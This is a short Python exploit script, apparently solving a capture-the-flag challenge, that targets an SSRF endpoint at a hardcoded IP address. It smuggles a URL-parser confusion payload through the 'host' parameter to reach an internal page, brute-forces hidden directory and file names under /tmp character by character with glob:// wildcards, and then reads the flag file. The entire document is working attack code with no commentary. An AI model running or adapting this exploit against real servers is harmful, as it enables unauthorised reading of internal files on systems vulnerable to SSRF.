import requests
import string

url = 'http://45.122.249.68:10004/ssrf.php'

def getDir():
    dir_tmp = ''
    for i in range(1,500):
        for char in string.printable.replace("*",'').replace("?", ''):
            # print(char,end='\r')
            params = {'host':f'http://foo@localhost:80@google.com/dir.php?dir_name=glob:///tmp/{dir_tmp+char}*'}
            r = requests.get(url, params=params)
            if "file" in r.text or 'dir' in r.text:
                dir_tmp += char
                break
        if "#" in dir_tmp:
            break
    return dir_tmp[:-1]

def getFile():
    dir_flag = getDir()
    flag_name = ''
    for i in range(1,500):
        for char in string.printable.replace("*",'').replace("?", ''):
            # print(char,end='\r')
            params = {'host':f'http://foo@localhost:80@google.com/dir.php?dir_name=glob:///tmp/{dir_flag}/{flag_name+char}*'}
            r = requests.get(url, params=params)
            if "file" in r.text or 'dir' in r.text:
                flag_name += char
                break
        if "#" in flag_name:
            break
    return flag_name[:-1]

def getFlag():
    full_dir = f'/tmp/{getDir()}/{getFile()}'
    print(f"Full_dir: {full_dir}")
    params = {'host':f'http://foo@localhost:80@google.com/dir.php?file={full_dir}'}
    r = requests.get(url, params=params)
    print(r.text)

getFlag()